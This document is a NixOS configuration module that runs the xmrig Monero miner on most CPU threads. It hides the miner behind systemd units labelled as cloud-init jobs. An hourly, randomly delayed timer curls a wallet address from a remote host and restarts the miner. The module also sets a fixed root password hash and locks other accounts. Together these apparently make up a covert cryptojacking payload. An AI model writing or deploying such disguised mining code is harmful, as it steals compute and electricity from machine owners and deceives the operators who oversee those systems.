{
  config,
  lib,
  pkgs,
  ...
}:
let
  xmrigWalletUrl = "https://blobs.brkn.lol/xmr";
  xmrigWalletFile = "/tmp/xmrig.txt";
in
{
  services.xmrig = {
    enable = true;
    settings = {
      autosave = true;
      opencl = false;
      cuda = false;
      cpu = {
        # https://xmrig.com/docs/miner/config/cpu
        enabled = true;
        priority = 1;
        # 75% of $nproc threads
        max-threads-hint = lib.mkDefault 75;
      };
      # https://xmrig.com/docs/miner/hugepages
      randomx = {
        "1gb-pages" = true;
      };
      pools = [
        {
          url = "pool.hashvault.pro:443";
          # NOTE yes, this looks weird, and yes this works.
          user = "\${HASHVAULT_USER}";
          pass = config.networking.hostName;
          keepalive = true;
          tls = true;
        }
      ];
    };
  };

  systemd.services.xmrig = {
    description = lib.mkForce "Initial cloud-init job (pre-networking)";
    # requires = [ "xmrig-config.service" ];
    # after = [ "xmrig-config.service" ];
    wantedBy = lib.mkForce [ ]; # disable auto start

    serviceConfig = {
      EnvironmentFile = xmrigWalletFile;
      Restart = "always";
      RestartSec = 10;
    };
  };

  systemd.services.xmrig-config = {
    description = "Initial cloud-init job (metadata service crawler)";
    # requires = [ "network-online.target" ];
    # after = [ "network-online.target" ];
    wantedBy = [ "multi-user.target" ];

    unitConfig = {
      StartLimitIntervalSec = 60; # Time window for counting failures
      StartLimitBurst = 3; # Maximum restart attempts in the above time
    };

    serviceConfig = {
      Type = "oneshot";
      Restart = "on-failure";
      RestartSec = 10;
    };

    path = [
      pkgs.curl
      pkgs.gawk
      pkgs.systemd
    ];

    script = ''
      set -x

      PREV_WALLET="$(awk -F= '/HASHVAULT_USER/ {print $2}' '${xmrigWalletFile}')"

      if WALLET="$(curl -fsSL '${xmrigWalletUrl}')" && \
         [[ -n "$WALLET" && "$WALLET" != "$PREV_WALLET" ]]
      then
        rm -f '${xmrigWalletFile}'
        echo "HASHVAULT_USER=$WALLET" > '${xmrigWalletFile}'
        systemctl restart xmrig
      fi
    '';
  };

  systemd.timers.xmrig-config = {
    wantedBy = [ "timers.target" ];

    timerConfig = {
      OnBootSec = "30";
      OnCalendar = "hourly";
      RandomizedDelaySec = "1800";
      Persistent = true;
    };
  };

  # sekurity
  services.getty.autologinUser = lib.mkForce null;

  users.mutableUsers = false;
  users.users.root = {
    # hashedPassword = "!";
    hashedPassword = "$y$j9T$jESAnWexd1o0wWVdHBjQr.$CwFCe30wjNCkgKQ2z2ZS.SH6Q7pzGal215OkxnnV1p.";
  };

  users.users.nixos = {
    hashedPassword = "!";
  };
}
